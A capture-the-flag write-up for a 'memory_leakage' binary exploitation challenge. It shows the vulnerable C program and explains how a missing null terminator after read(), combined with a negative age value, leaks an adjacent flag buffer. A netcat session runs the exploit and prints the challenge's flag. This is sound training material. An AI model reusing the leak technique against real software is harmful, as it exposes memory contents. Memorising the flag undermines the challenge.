# Write-up of the challenge "memory_leakage"

This challenge is part of the "Binary exploitation" category and is in **Level 1**.

# Goal of the challenge

The objective of this challenge is remove any **null bytes**, so that the read won't stop reading and will read the **flag buff**.

## Program structure

```
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>

FILE *fp;

struct my_page
{
	char name[16];
	int age;
};

void alarm_handler()
{
	puts("TIME OUT");
	exit(-1);
}

void initialize()
{
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);

	signal(SIGALRM, alarm_handler);
	alarm(30);
}

int main()
{
	struct my_page my_page;
	char flag_buf[56];
	int idx;

	memset(flag_buf, 0, sizeof(flag_buf));

	initialize();

	while (1)
	{
		printf("1. Join\n");
		printf("2. Print information\n");
		printf("3. GIVE ME FLAG!\n");
		printf("> ");
		scanf("%d", &idx);
		switch (idx)
		{
		case 1:
			printf("Name: ");
			read(0, my_page.name, sizeof(my_page.name));

			printf("Age: ");
			scanf("%d", &my_page.age);
			break;
		case 2:
			printf("Name: %s\n", my_page.name);
			printf("Age: %d\n", my_page.age);
			break;
		case 3:
			fp = fopen("/flag", "r");
			fread(flag_buf, 1, 56, fp);
			break;
		default:
			break;
		}
	}
}

```

## Security breach

The vulnerability here is that the read is not adding **null bytes** at the end which can lead to it reading more than it should.

```
    read(0, my_page.name, sizeof(my_page.name));
```

Also **bof**, found it while decompiling:

```
    unsigned long v1; = max 8 bytes
    read(0, &v1, 16);
```

## Solution

So my idea was to make the read full and then just put a negative age. When the read is full we can ensure that we overwrote any existing nullbytes. Since negative age like **-1** ensures it does not include any null bytes because it looks like this in binary **0xFFFFFFFF**. The reason we can't put a positive value is because it might contain null bytes like 1 for example **0x01000000**.

Solve process:

```
nc host8.dreamhack.games 11460
1. Join
2. Print information
3. GIVE ME FLAG!
> 1
Name: AAAAAAAAAAAAAAAA
Age: 1
1. Join
2. Print information
3. GIVE ME FLAG!
> 3
1. Join
2. Print information
3. GIVE ME FLAG!
> 2
Name: AAAAAAAAAAAAAAAA
Age: 1
1. Join
2. Print information
3. GIVE ME FLAG!
> 1
Name: AAAAAAAAAAAAAAAA
Age: -1
1. Join
2. Print information
3. GIVE ME FLAG!
> 2
Name: AAAAAAAAAAAAAAAA����DH{a77ae81944bbbe70adb10d98dc191379}
Age: -1
1. Join
2. Print information
3. GIVE ME FLAG!
>
```
